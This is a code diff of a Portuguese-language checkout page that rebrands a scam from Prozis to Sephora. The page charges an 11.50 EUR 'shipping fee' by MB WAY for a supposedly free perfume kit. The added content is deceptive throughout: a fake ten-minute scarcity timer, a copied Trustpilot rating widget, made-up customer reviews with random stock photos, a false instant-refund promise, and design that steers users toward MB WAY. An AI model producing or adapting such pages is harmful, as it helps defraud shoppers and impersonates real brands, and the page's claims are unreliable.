@@ -5,10 +5,10 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="/static/js/tracker.js"></script>
-    <title>Pagamento de Envio - Prozis</title>
-    <link rel="stylesheet" href="style.css?v=38">
-    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-    <link rel="icon" href="assets/prozis-logo.svg" type="image/svg+xml">
+    <title>Pagamento de Envio - Sephora</title>
+    <link rel="stylesheet" href="style.css?v=39">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" href="/assets/sephora-logo-white.png" type="image/png">
 
     <!-- Meta Pixel Code -->
     <script>
@@ -32,35 +32,35 @@
     <!-- End Meta Pixel Code -->
 
     <style>
-        /* Prozis Theme Overrides */
+        /* Sephora Theme Overrides */
+
+
         body {
-            font-family: 'Exo 2', sans-serif;
-            background: #f5f5f5 !important;
-            margin: 0;
-            padding: 0;
-            color: #111;
-            /* Removed flex center to fix header width */
+            font-family: 'Inter', sans-serif;
+            background: #fff !important;
         }
 
-        #prozis-header {
+        #sephora-header {
             background: #000;
-            padding: 15px 0;
+            padding: 5px 0;
             text-align: center;
-            border-bottom: 3px solid #e32526;
+            border-bottom: 2px solid #ffebf6;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             width: 100%;
         }
 
-        #prozis-header img {
-            height: 25px;
+        #sephora-header img {
+            height: 64px;
         }
 
         .main-container {
+            width: 95%;
+            /* Responsive width for mobile */
             max-width: 500px;
             margin: 30px auto;
             background: white;
-            border-radius: 8px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            border-radius: 4px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
             overflow: hidden;
             padding: 30px 25px;
         }
@@ -73,15 +73,15 @@
         }
 
         .box-icon {
-            color: #25a01c;
-            /* Green Icon */
+            color: #000;
+            /* Black Icon */
             margin-bottom: 15px;
         }
 
         .summary-box {
-            background: #fff;
+            background: #f9f9f9;
             border: 1px solid #eee;
-            border-radius: 8px;
+            border-radius: 4px;
             padding: 20px;
             margin-bottom: 30px;
         }
@@ -91,7 +91,7 @@
             justify-content: space-between;
             margin-bottom: 12px;
             font-size: 14px;
-            color: #666;
+            color: #333;
         }
 
         .info-row.total {
@@ -99,7 +99,7 @@
             font-weight: 800;
             margin-top: 15px;
             padding-top: 15px;
-            border-top: 1px solid #eee;
+            border-top: 1px solid #ddd;
             font-size: 18px;
         }
 
@@ -111,8 +111,8 @@
         }
 
         .payment-option {
-            border: 2px solid #eee;
-            border-radius: 8px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
             padding: 20px;
             cursor: pointer;
             display: flex;
@@ -122,55 +122,152 @@
             min-height: 100px;
             transition: all 0.2s;
             position: relative;
+            background: #fff;
         }
 
-        .payment-option:hover,
+        /* Unselected State (Default Dimmed) */
+        .payment-option:not(.selected) {
+            opacity: 0.6;
+            filter: grayscale(100%);
+            border-color: #ddd;
+        }
+
+        /* Selected State (Base) */
         .payment-option.selected {
-            border-color: #25a01c;
-            /* Green selection */
-            background: rgba(37, 160, 28, 0.05);
+            opacity: 1;
+            filter: none;
+            border-color: #000;
+        }
+
+        /* MB WAY Specific Styles */
+        .payment-option[data-type="mbway"].selected {
+            border-color: #00b67a;
+            background: rgba(0, 182, 122, 0.05);
+            box-shadow: 0 4px 15px rgba(0, 182, 122, 0.1);
+        }
+
+        .payment-option:hover {
+            opacity: 0.9;
+            border-color: #999;
+        }
+
+        .payment-option[data-type="mbway"]:hover {
+            border-color: #00b67a;
         }
 
         .badge-most-used {
             position: absolute;
             top: -10px;
-            background: #25a01c;
+            background: #00b67a;
             /* Green Badge */
-            color: white;
+            color: #fff;
             font-size: 10px;
             padding: 3px 10px;
-            border-radius: 10px;
+            border-radius: 2px;
             font-weight: 700;
             display: block;
+            text-transform: uppercase;
         }
 
         .payment-logo {
-            max-width: 160px;
-            /* Increased size */
-            max-height: 80px;
+            max-width: 140px;
+            max-height: 70px;
             object-fit: contain;
         }
 
         .validation-btn {
             width: 100%;
             padding: 18px;
-            background: #25a01c;
-            /* Green Button */
+            background: #000;
+            /* Black Button */
             color: white;
             font-weight: 800;
             border: none;
-            border-radius: 5px;
+            border-radius: 2px;
             font-size: 18px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(37, 160, 28, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
             text-transform: uppercase;
             transition: all 0.2s;
+            letter-spacing: 1px;
         }
 
         .validation-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(37, 160, 28, 0.5);
-            background: #208a18;
+            transform: scale(1.02);
+            box-shadow: 0 6px 25px rgba(40, 167, 69, 0.4);
+            background: #00b67a;
+        }
+
+        /* Pulse Animation */
+        @keyframes pulse-green-btn {
+            0% {
+                box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.7);
+            }
+
+            70% {
+                box-shadow: 0 0 0 15px rgba(40, 167, 69, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(40, 167, 69, 0);
+            }
+        }
+
+        /* Shine Effect */
+        @keyframes shine {
+            0% {
+                left: -100%;
+            }
+
+            20% {
+                left: 100%;
+            }
+
+            100% {
+                left: 100%;
+            }
+        }
+
+        /* Steps Section Styles */
+        .steps-container {
+            margin-top: 30px;
+            text-align: left;
+            border-top: 1px solid #eee;
+            padding-top: 25px;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            align-items: flex-start;
+        }
+
+        .step-icon {
+            background: #f5f5f5;
+            color: #000;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .step-content h4 {
+            margin: 0 0 5px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #000;
+        }
+
+        .step-content p {
+            margin: 0;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.4;
         }
 
         /* Modal Styles */
@@ -181,7 +278,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.9);
             z-index: 1000;
             align-items: center;
             justify-content: center;
@@ -192,11 +289,12 @@
         .modal-content {
             background: white;
             padding: 30px;
-            border-radius: 10px;
+            border-radius: 4px;
             width: 100%;
             max-width: 400px;
             text-align: center;
             animation: slideUp 0.3s ease;
+            border-top: 4px solid #ffebf6;
         }
 
         @keyframes slideUp {
@@ -211,103 +309,595 @@
             }
         }
 
+        /* Footer override */
         footer {
+            background: #000;
+            color: white;
+            padding: 40px 20px;
             text-align: center;
-            padding: 30px;
+            margin-top: auto;
+            width: 100%;
+            border-top: 2px solid #ffebf6;
+        }
+
+        footer p {
             font-size: 12px;
-            color: #999;
+            opacity: 0.7;
+            margin: 0;
+        }
+
+        /* Trustpilot Widget Styles */
+        /* Trustpilot Widget Styles */
+        .styles_ratingDistribution__JrEa8 {
+            display: flex;
+            gap: 20px;
+            background: #fff;
+            /* Clean White Background */
+            padding: 10px 0;
+            margin-bottom: 25px;
+            align-items: center;
+        }
+
+        .styles_text__KLs3V {
+            text-align: center;
+            width: 30%;
+            /* Reduced width */
+        }
+
+        .styles_trustScore__MVJJI {
+            font-size: 32px;
+            /* Drastically Reduced from 64px */
+            font-weight: 900;
+            line-height: 1;
+            margin: 0;
+            color: #1a1a1a;
+        }
+
+        .styles_starRatingName__njtqK {
+            font-size: 14px;
+            /* Reduced from 18px */
+            font-weight: 700;
+            margin: 5px 0 8px;
+        }
+
+        .styles_distributions__3hJ2W {
+            flex: 1;
+            width: 100%;
+            padding-right: 10px;
+        }
+
+        .rating-distribution-row_row__TH3OE {
+            display: flex;
+            align-items: center;
+            margin-bottom: 6px;
+            font-size: 13px;
+            color: #1a1a1a;
+        }
+
+        .CDS_Typography_body-s__68c681 {
+            width: 65px;
+            font-weight: 700;
+            white-space: nowrap;
+        }
+
+        .rating-distribution-row_bar__XYypx {
+            flex: 1;
+            height: 12px;
+            background-color: #e8e8e8;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-left: 10px;
+        }
+
+        .rating-distribution-row_barValue__iFje4 {
+            display: block;
+            height: 100%;
+            border-radius: 6px;
+        }
+
+        /* Multicolor Bars (Print Style) */
+        .styles_distributions__3hJ2W .rating-distribution-row_row__TH3OE:nth-child(1) .rating-distribution-row_barValue__iFje4 {
+            background-color: #00b67a;
+            /* 5 Star */
+        }
+
+        .styles_distributions__3hJ2W .rating-distribution-row_row__TH3OE:nth-child(2) .rating-distribution-row_barValue__iFje4 {
+            background-color: #00b67a;
+            /* 4 Star */
+        }
+
+        .styles_distributions__3hJ2W .rating-distribution-row_row__TH3OE:nth-child(3) .rating-distribution-row_barValue__iFje4 {
+            background-color: #ffcc00;
+            /* 3 Star */
+        }
+
+        .styles_distributions__3hJ2W .rating-distribution-row_row__TH3OE:nth-child(4) .rating-distribution-row_barValue__iFje4 {
+            background-color: #ff8622;
+            /* 2 Star */
+        }
+
+        .styles_distributions__3hJ2W .rating-distribution-row_row__TH3OE:nth-child(5) .rating-distribution-row_barValue__iFje4 {
+            background-color: #ff3722;
+            /* 1 Star */
+        }
+
+        /* Mobile Responsive for Widget */
+        @media (max-width: 480px) {
+            .styles_ratingDistribution__JrEa8 {
+                flex-direction: row;
+                /* Keep row */
+                align-items: center;
+            }
+
+            .styles_text__KLs3V {
+                width: 35%;
+                margin-bottom: 0;
+            }
+        }
+
+        /* Review Card Updates */
+        .review-img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #00b67a;
+            /* Trustpilot Green Ring */
+            padding: 2px;
+            /* Gap for "Story" effect */
+            background: white;
+        }
+
+        .review-stars-img {
+            width: 80px;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .trustpilot-mini-logo {
+            height: 14px;
+            margin-left: 6px;
+            vertical-align: middle;
+            opacity: 0.9;
         }
     </style>
 </head>
 
 <body>
     <!-- Header -->
-    <div id="prozis-header">
-        <img src="assets/prozis-logo.svg" alt="Prozis">
+    <div id="sephora-header">
+        <img src="/assets/sephora-logo-white.png" alt="Sephora">
     </div>
 
     <div class="main-container">
 
-        <div class="shipping-header">
-            <svg class="box-icon" width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path
-                    d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z">
-                </path>
-                <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
-                <line x1="12" y1="22.08" x2="12" y2="12"></line>
-            </svg>
-            <h2 style="margin: 0; font-size: 22px; font-weight: 800; text-transform: uppercase;">Finalizar Envio</h2>
+        <div class="shipping-header" style="margin-bottom: 5px; padding-bottom: 5px;">
+            <!-- Truck Icon (User Request) -->
+            <img src="https://www.sephora.pt/on/demandware.static/-/Sites/default/dw35a07c56/truck.svg" class="box-icon"
+                alt="Entregas" width="50" height="50">
+            <h2
+                style="margin: 0; font-size: 22px; font-weight: 800; text-transform: uppercase; letter-spacing: -0.5px;">
+                Finalizar Envio</h2>
             <p style="margin: 10px 0 0; color: #666; font-size: 14px;">Confirma os dados para expedição imediata.</p>
         </div>
 
+        <!-- Scarcity Timer (User Request) -->
+        <div id="scarcityTimer" style="
+            text-align: center;
+            margin: 0 0 5px;
+            font-size: 15px;
+            color: #555;
+            background: #f0fdf4;
+            border: 1px solid #00b67a;
+            padding: 12px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 2px 5px rgba(0, 182, 122, 0.05);
+        ">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00b67a" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            <span>A oferta reservada expira em <strong id="timerCountdown"
+                    style="color: #00b67a; font-size: 16px;">10:00</strong></span>
+        </div>
+
         <div class="summary-box">
-            <h4 style="margin: 0 0 15px; font-weight: 700; text-transform: uppercase; font-size: 14px;">Resumo do Pedido
+            <h4
+                style="margin: 0 0 15px; font-weight: 700; text-transform: uppercase; font-size: 14px; letter-spacing: 0.5px;">
+                Resumo do Pedido
             </h4>
 
             <div class="info-row">
-                <span>Kit Completo Prozis</span>
-                <span style="color: #25a01c; font-weight: 700;">GRÁTIS</span>
+                <span>Kit Sephora Perfumes (3 Unid.)</span>
+                <span style="color: #00b67a; font-weight: 700;">GRÁTIS</span>
             </div>
             <div class="info-row">
                 <span>Peso Total (Estimado)</span>
-                <span>2.4 kg</span>
+                <span>200g - 900g</span>
             </div>
             <div class="info-row">
                 <span>Método de Envio</span>
-                <span>Expresso (24h)</span>
+                <span id="shippingMethod">Expresso (24h)</span>
             </div>
 
-            <div class="info-row total">
+            <div class="info-row total" style="margin-top: 25px; padding-top: 20px; border-top: 1px solid #eee;">
                 <span>Total a Pagar (Portes)</span>
-                <span style="color: #25a01c;">12.99 €</span>
+                <span style="color: #00b67a; font-size: 24px; margin-left: 10px;">11.50 €</span>
             </div>
         </div>
 
-        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 15px; text-transform: uppercase;">Pagamento Seguro:
+        <h3
+            style="font-size: 16px; font-weight: 700; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 0.5px;">
+            Pagamento Seguro:
         </h3>
 
         <div class="payment-grid">
-            <div class="payment-option selected" onclick="selectPayment(this, 'mbway')">
-                <div class="badge-most-used">MAIS RÁPIDO</div>
+            <div class="payment-option selected" onclick="selectPayment(this, 'mbway')" data-type="mbway">
+                <div class="badge-most-used"
+                    style="background: #00b67a; top: -12px; padding: 4px 12px; font-size: 11px;">
+                    MAIS RÁPIDO</div>
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
-                    class="payment-logo" alt="MB WAY" style="height: 45px;">
-                <div style="font-size: 11px; color: #666; margin-top: 8px;">Processamento Imediato</div>
+                    class="payment-logo" alt="MB WAY" style="height: 45px; margin-bottom: 5px;">
+                <div
+                    style="font-size: 12px; color: #00b67a; margin-top: 5px; font-weight: 700; display: flex; align-items: center; gap: 5px;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                    </svg>
+                    Processamento Imediato • Prioridade no Envio
+                </div>
             </div>
 
-            <div class="payment-option" onclick="selectPayment(this, 'multibanco')">
+            <div class="payment-option" onclick="selectPayment(this, 'multibanco')" data-type="multibanco">
+                <div class="badge-most-used" style="background: #999; top: -12px; padding: 4px 12px; font-size: 11px;">
+                    PADRÃO</div>
                 <img src="https://www.multibanco.pt/wp-content/uploads/2025/01/Multibanco-Logo-CMYK.svg"
-                    class="payment-logo" alt="Multibanco">
-                <div style="font-size: 11px; color: #666; margin-top: 8px;">Pagamento por Ref.</div>
+                    class="payment-logo" alt="Multibanco" style="height: 35px;">
+                <div style="font-size: 11px; color: #999; margin-top: 8px;">Processamento lento (até 48h úteis)</div>
             </div>
         </div>
 
-        <p style="text-align: center; font-size: 11px; color: #999; margin-bottom: 25px;">
+        <p style="text-align: center; font-size: 11px; color: #666; margin-bottom: 25px; line-height: 1.5;">
             Ao confirmar, a tua encomenda será processada imediatamente nos nossos armazéns logísticos.
         </p>
 
-        <button class="validation-btn" onclick="processPayment()">
-            PAGAR PORTES (12.99€)
+        <button class="validation-btn" onclick="processPayment()"
+            style="background: #00b67a; position: relative; overflow: hidden; animation: pulse-green-btn 2s infinite;">
+            PAGAR PORTES (11.50€)
+            <div
+                style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); animation: shine 3s infinite;">
+            </div>
         </button>
-    </div>
 
-    <footer>
-        <p>© 2024 Prozis.com. Todos os direitos reservados.</p>
-        <p style="margin-top: 10px;">Pagamentos processados de forma segura SSL/TLS.</p>
-    </footer>
+        <!-- How it Works Section -->
+        <div class="steps-container">
+            <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 20px; text-transform: uppercase;">Como Funciona
+                o Envio</h3>
+
+            <div class="step-item">
+                <div class="step-icon">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                </div>
+                <div class="step-content">
+                    <h4>Logística Iniciada</h4>
+                    <p>O teu kit já está no nosso centro logístico, pronto para sair imediatamente.</p>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <div class="step-icon">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                        <line x1="1" y1="10" x2="23" y2="10"></line>
+                    </svg>
+                </div>
+                <div class="step-content">
+                    <h4>Pagamento Confirmado</h4>
+                    <p>Assim que confirmares, geramos a fatura e o código de rastreio automaticamente.</p>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <div class="step-icon">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <path
+                            d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z">
+                        </path>
+                        <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                        <line x1="12" y1="22.08" x2="12" y2="12"></line>
+                    </svg>
+                </div>
+                <div class="step-content">
+                    <h4>Envio & Rastreio</h4>
+                    <p>Recebes tudo no email e a entrega é feita no prazo escolhido (Expresso ou Tradicional).</p>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <div class="step-icon">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                    </svg>
+                </div>
+                <div class="step-content">
+                    <h4>Reembolso Automático</h4>
+                    <p>Qualquer problema? No próprio link de rastreio tens um botão de "Solicitar Reembolso". O valor
+                        volta na hora para o teu MB WAY ou conta, sem falar com ninguém.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Customer Reviews Section -->
+        <div class="reviews-section">
+            <!-- Trustpilot Widget (User Request) -->
+            <div class="styles_ratingDistribution__JrEa8">
+                <div class="styles_text__KLs3V">
+                    <p class="styles_trustScore__MVJJI">4,4</p>
+                    <h4 class="styles_starRatingName__njtqK">Excelente</h4>
+                    <img class="CDS_StarRating_starRating__614d2e CDS_StarRating_starRatingResponsive__614d2e"
+                        alt="O TrustScore é 4.5 de um total de 5" width="100%"
+                        src="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-4.5.svg">
+                    <p class="styles_reviewCount__NXlel">33 avaliações</p>
+                </div>
+                <div class="styles_distributions__3hJ2W">
+                    <div class="rating-distribution-row_row__TH3OE" data-star-rating="five">
+                        <span class="CDS_Typography_body-s__68c681">5 estrelas</span>
+                        <div class="rating-distribution-row_bar__XYypx">
+                            <span class="rating-distribution-row_barValue__iFje4"
+                                style="width:69.6969696969697%"></span>
+                        </div>
+                    </div>
+                    <div class="rating-distribution-row_row__TH3OE" data-star-rating="four">
+                        <span class="CDS_Typography_body-s__68c681">4 estrelas</span>
+                        <div class="rating-distribution-row_bar__XYypx">
+                            <span class="rating-distribution-row_barValue__iFje4"
+                                style="width:15.151515151515152%"></span>
+                        </div>
+                    </div>
+                    <div class="rating-distribution-row_row__TH3OE" data-star-rating="three">
+                        <span class="CDS_Typography_body-s__68c681">3 estrelas</span>
+                        <div class="rating-distribution-row_bar__XYypx">
+                            <span class="rating-distribution-row_barValue__iFje4"
+                                style="width:9.090909090909092%"></span>
+                        </div>
+                    </div>
+                    <div class="rating-distribution-row_row__TH3OE" data-star-rating="two">
+                        <span class="CDS_Typography_body-s__68c681">2 estrelas</span>
+                        <div class="rating-distribution-row_bar__XYypx">
+                            <span class="rating-distribution-row_barValue__iFje4"
+                                style="width:3.0303030303030303%"></span>
+                        </div>
+                    </div>
+                    <div class="rating-distribution-row_row__TH3OE" data-star-rating="one">
+                        <span class="CDS_Typography_body-s__68c681">1 estrela</span>
+                        <div class="rating-distribution-row_bar__XYypx">
+                            <span class="rating-distribution-row_barValue__iFje4"
+                                style="width:3.0303030303030303%"></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="reviews-container">
+                <!-- Review 1 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://loremflickr.com/150/150/delivery,box" alt="Customer Photo" class="review-img">
+                        <div>
+                            <div class="review-name">Rita M.</div>
+                            <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-5.svg"
+                                class="review-stars-img" alt="5 Stars">
+                        </div>
+                    </div>
+                    <p class="review-text">"A entrega foi super rápida, recebi em menos de 24h! A caixa vinha impecável,
+                        recomendo muito."</p>
+                    <div class="review-date">
+                        Há 2 dias
+                        <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/logo-black.svg"
+                            class="trustpilot-mini-logo" alt="Trustpilot">
+                    </div>
+                </div>
+
+                <!-- Review 2 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://loremflickr.com/150/150/makeup,cosmetics" alt="Customer Photo"
+                            class="review-img">
+                        <div>
+                            <div class="review-name">Joana S.</div>
+                            <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-5.svg"
+                                class="review-stars-img" alt="5 Stars">
+                        </div>
+                    </div>
+                    <p class="review-text">"Adorei o Kit! Vale muito a pena pelo valor dos portes. Os produtos são
+                        originais e de qualidade."</p>
+                    <div class="review-date">
+                        Há 3 dias
+                        <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/logo-black.svg"
+                            class="trustpilot-mini-logo" alt="Trustpilot">
+                    </div>
+                </div>
+
+                <!-- Review 3 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://loremflickr.com/150/150/woman,happy" alt="Customer Photo" class="review-img">
+                        <div>
+                            <div class="review-name">Mariana Silva</div>
+                            <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-5.svg"
+                                class="review-stars-img" alt="5 Stars">
+                        </div>
+                    </div>
+                    <p class="review-text">"Estava com receio do pagamento mas o MB WAY é super seguro. Processo muito
+                        simples e transparente."</p>
+                    <div class="review-date">
+                        Há 5 dias
+                        <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/logo-black.svg"
+                            class="trustpilot-mini-logo" alt="Trustpilot">
+                    </div>
+                </div>
+
+                <!-- Review 4 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://loremflickr.com/150/150/perfume" alt="Customer Photo" class="review-img">
+                        <div>
+                            <div class="review-name">Beatriz C.</div>
+                            <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-5.svg"
+                                class="review-stars-img" alt="5 Stars">
+                        </div>
+                    </div>
+                    <p class="review-text">"Já recebi! O perfume é maravilhoso, obrigada Sephora! Vou certamente voltar
+                        a encomendar."</p>
+                    <div class="review-date">
+                        Há 1 semana
+                        <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/logo-black.svg"
+                            class="trustpilot-mini-logo" alt="Trustpilot">
+                    </div>
+                </div>
+
+                <!-- Review 5 -->
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://loremflickr.com/150/150/gift,box" alt="Customer Photo" class="review-img">
+                        <div>
+                            <div class="review-name">Ana P.</div>
+                            <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-5.svg"
+                                class="review-stars-img" alt="5 Stars">
+                        </div>
+                    </div>
+                    <p class="review-text">"Tudo certo, recebi o email de confirmação na hora. O seguimento da encomenda
+                        funcionou perfeitamente."</p>
+                    <div class="review-date">
+                        Há 1 semana
+                        <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/logo-black.svg"
+                            class="trustpilot-mini-logo" alt="Trustpilot">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div> <!-- Closing main-container -->
 
     <!-- Loading Overlay -->
     <div id="loadingOverlay" class="modal-overlay" style="flex-direction: column;">
         <div class="spinner-large"></div>
-        <h3 style="margin-top: 20px; color: #e32526; font-weight: 700;">A Processar Pedido...</h3>
+        <h3 style="margin-top: 20px; color: #ffebf6; font-weight: 700; text-transform: uppercase;">A Processar
+            Pedido...
+        </h3>
         <p style="color: white; font-size: 14px;">Não feche a janela.</p>
     </div>
     <style>
+        /* Restored Reviews CSS */
+        .reviews-section {
+            padding: 20px 0 0;
+            background: #fff;
+            margin-top: 30px;
+            border-top: 1px solid #eee;
+        }
+
+        .reviews-section h3 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: #000;
+            text-transform: uppercase;
+        }
+
+        .reviews-subtitle {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .reviews-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .review-card {
+            width: 100%;
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: none;
+            border: 1px solid #eee;
+            box-sizing: border-box;
+        }
+
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .review-img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #00b67a;
+            padding: 2px;
+            background: white;
+        }
+
+        .review-name {
+            font-size: 13px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .review-stars {
+            color: #00b67a;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        .review-stars-img {
+            width: 80px;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .review-text {
+            font-size: 13px;
+            line-height: 1.5;
+            color: #555;
+            margin-bottom: 10px;
+            font-style: italic;
+        }
+
+        .review-date {
+            font-size: 11px;
+            color: #999;
+            text-align: right;
+        }
+
+        .trustpilot-mini-logo {
+            height: 14px;
+            margin-left: 6px;
+            vertical-align: middle;
+            opacity: 0.9;
+        }
+
         .spinner-large {
             width: 50px;
             height: 50px;
             border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top-color: #fff;
+            border-top-color: #ffebf6;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -323,31 +913,28 @@
         }
     </style>
 
-    <!-- MB WAY Phone Confirmation -->
-    <div id="mbwayModal" class="modal-overlay">
-        <div class="modal-content">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
-                style="height: 30px; margin-bottom: 20px;">
-            <h3 style="margin: 0 0 10px; font-size: 18px; color: #000;">Confirmar Número</h3>
-            <p style="font-size: 14px; color: #555; margin-bottom: 20px;">
-                Enviar pedido de pagamento para:
-            </p>
-            <div style="background: #f4f4f4; padding: 15px; font-weight: 800; font-size: 22px; border-radius: 8px; margin-bottom: 25px; color: #000;"
-                id="confirmPhoneDisplay">
-                --- --- ---
-            </div>
+    <footer>
+        <img src="/assets/sephora-logo-white.png" style="width: 140px; opacity: 0.5; margin-bottom: 20px;">
 
-            <button class="validation-btn" style="background: #000; margin-bottom: 10px;"
-                onclick="finalizeMBWay()">CONFIRMAR</button>
-            <button
-                style="background: none; border: none; color: #777; font-size: 13px; cursor: pointer; text-decoration: underline;"
-                onclick="closePaymentModal()">Alterar Número</button>
+        <div style="font-size: 11px; color: #999; margin-bottom: 20px; line-height: 1.6;">
+            © 2024 Sephora. Todos os direitos reservados. · <a href="#"
+                style="color: #999; text-decoration: none;">Política de Privacidade</a> · <a href="#"
+                style="color: #999; text-decoration: none;">Termos e Condições</a><br>
+            Preços e promoções sujeitos a alteração. IVA incluído à taxa legal.
         </div>
-    </div>
+
+        <div style="display: flex; justify-content: center; gap: 15px; align-items: center; opacity: 0.8;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
+                alt="MB WAY"
+                style="height: 25px; object-fit: contain; background: white; padding: 2px 5px; border-radius: 4px;">
+            <img src="https://www.multibanco.pt/wp-content/uploads/2025/01/Multibanco-Logo-CMYK.svg" alt="Multibanco"
+                style="height: 25px; object-fit: contain; background: white; padding: 2px 5px; border-radius: 4px;">
+        </div>
+    </footer>
 
     <!-- Invalid MB WAY Number Modal -->
     <div id="invalidMbwayModal" class="modal-overlay">
-        <div class="modal-content" style="border-top: 4px solid #e32526;">
+        <div class="modal-content" style="border-top: 4px solid #ffebf6;">
             <div
                 style="width: 60px; height: 60px; background: #fee2e2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
                 <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2"
